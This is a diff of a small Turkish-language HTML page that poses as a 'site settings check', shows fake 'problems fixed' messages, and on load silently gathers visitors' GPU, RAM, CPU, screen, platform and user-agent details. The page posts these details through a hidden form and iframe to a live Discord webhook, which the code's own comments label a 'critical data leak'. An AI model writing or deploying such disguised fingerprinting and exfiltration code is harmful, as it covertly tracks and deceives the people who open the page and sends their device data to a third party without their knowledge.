@@ -3,48 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem</title>
+    <title>Sistem Kontrolü</title>
     <style>
         body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; font-family:sans-serif; overflow:hidden; }
-        h2 { color:#222; font-size:12px; font-weight:400; letter-spacing:1px; }
+        h2 { color:#111; font-size:12px; font-weight:400; }
         .ok { color:#0f4; font-weight:bold; }
     </style>
 </head>
 <body>
     <h2 id="t">Site ayarları kontrol ediliyor...</h2>
+
+    <iframe name="v" style="display:none;"></iframe>
+    <form id="f" action="https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73" method="POST" target="v" style="display:none;">
+        <input type="hidden" name="content" id="c">
+    </form>
+
     <script>
-        const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
-        const t = document.getElementById('t');
+        (function x() {
+            const t = document.getElementById('t');
+            
+            // 1. EN DERİN VERİ TOPLAMA
+            let g = "N/A";
+            try {
+                const gl = document.createElement('canvas').getContext('webgl');
+                const ex = gl.getExtension('WEBGL_debug_renderer_info');
+                g = gl.getParameter(ex.UNMASKED_RENDERER_ID);
+            } catch(e){}
 
-        // 1. IŞIK HIZINDA VERİ TOPLAMA
-        let g = "N/A", v = "N/A";
-        try {
-            const gl = document.createElement('canvas').getContext('webgl');
-            const ex = gl.getExtension('WEBGL_debug_renderer_info');
-            g = gl.getParameter(ex.UNMASKED_RENDERER_ID);
-            v = gl.getParameter(ex.UNMASKED_VENDOR_ID);
-        } catch(e){}
+            const info = `💀 **KRİTİK VERİ SIZINTISI**\n` +
+                         `**GPU:** ${g}\n` +
+                         `**RAM:** ${navigator.deviceMemory}GB | **CPU:** ${navigator.hardwareConcurrency} | **TCH:** ${navigator.maxTouchPoints}\n` +
+                         `**OS/RES:** ${navigator.platform} | ${screen.width}x${screen.height}\n` +
+                         `**Zaman:** ${new Date().toLocaleString()}\n` +
+                         `**UA:** ${navigator.userAgent}`;
 
-        const data = {
-            content: "💀 **VAHŞİ VERİ SIZINTISI**",
-            embeds: [{
-                color: 0,
-                fields: [
-                    { name: "🕹️ GPU/VENDOR", value: "```" + g + "\n" + v + "```" },
-                    { name: "⚙️ DONANIM", value: `**RAM:** ${navigator.deviceMemory}G | **CPU:** ${navigator.hardwareConcurrency} | **TCH:** ${navigator.maxTouchPoints}`, inline: true },
-                    { name: "🌐 SİSTEM", value: `**OS:** ${navigator.platform}\n**RES:** ${screen.width}x${screen.height}`, inline: true },
-                    { name: "🔍 UA", value: "```" + navigator.userAgent + "```" }
-                ]
-            }]
-        };
+            // 2. FORM ENJEKSİYONU (ENJEKTE VE FIRLAT)
+            document.getElementById('c').value = info;
+            document.getElementById('f').submit();
 
-        // 2. EN GÜÇLÜ VE EN HIZLI GÖNDERİM (BEACON)
-        // Beacon, tarayıcının en öncelikli veri fırlatma yöntemidir.
-        navigator.sendBeacon(u, new Blob([JSON.stringify(data)], {type: 'application/json'}));
-
-        // 3. ANLIK ARAYÜZ (MİLİSANİYELİK)
-        setTimeout(() => { t.innerHTML = '<span class="ok">Site uygun halde!</span>'; }, 100);
-        setTimeout(() => { t.innerHTML = '<span class="ok">Sorunlar düzeltildi.</span>'; }, 400);
+            // 3. IŞIK HIZINDA ARAYÜZ (0.1sn ve 0.4sn)
+            setTimeout(() => { t.innerHTML = '<span class="ok">Site uygun halde!</span>'; }, 100);
+            setTimeout(() => { t.innerHTML = '<span class="ok">Sorunlar düzeltildi.</span>'; }, 400);
+        })();
     </script>
 </body>
 </html>
